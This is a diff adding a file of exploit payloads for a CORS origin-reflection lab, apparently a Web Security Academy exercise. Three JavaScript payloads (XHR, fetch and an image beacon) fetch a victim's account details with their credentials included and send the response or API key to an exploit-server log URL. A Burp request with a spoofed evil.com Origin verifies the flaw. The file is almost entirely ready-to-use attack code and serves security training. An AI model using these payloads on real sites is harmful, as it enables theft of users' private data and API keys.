@@ -1,1 +1,50 @@
-payload template
+# ============================================================
+# CORS Basic Origin Reflection — Payloads
+# ============================================================
+
+# ── PAYLOAD 1: Basic exploit (simple redirect to log server) ──────────────────
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
+  req.withCredentials = true;
+  req.send();
+  function reqListener() {
+    location = 'https://EXPLOIT-ID.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
+  }
+</script>
+
+
+# ── PAYLOAD 2: Using fetch() API instead of XHR ──────────────────────────────
+<script>
+  fetch('https://LAB-ID.web-security-academy.net/accountDetails', {
+    credentials: 'include'
+  })
+  .then(r => r.text())
+  .then(data => {
+    location = 'https://EXPLOIT-ID.exploit-server.net/log?key=' + encodeURIComponent(data);
+  });
+</script>
+
+
+# ── PAYLOAD 3: Exfil via image beacon (stealthier) ───────────────────────────
+<script>
+  fetch('https://LAB-ID.web-security-academy.net/accountDetails', {
+    credentials: 'include'
+  })
+  .then(r => r.json())
+  .then(data => {
+    new Image().src = 'https://EXPLOIT-ID.exploit-server.net/log?key=' + data.apiKey;
+  });
+</script>
+
+
+# ── VERIFY vuln manually (Burp Repeater) ─────────────────────────────────────
+GET /accountDetails HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Cookie: session=YOUR_SESSION
+Origin: https://evil.com
+
+# Expected response shows:
+# Access-Control-Allow-Origin: https://evil.com
+# Access-Control-Allow-Credentials: true
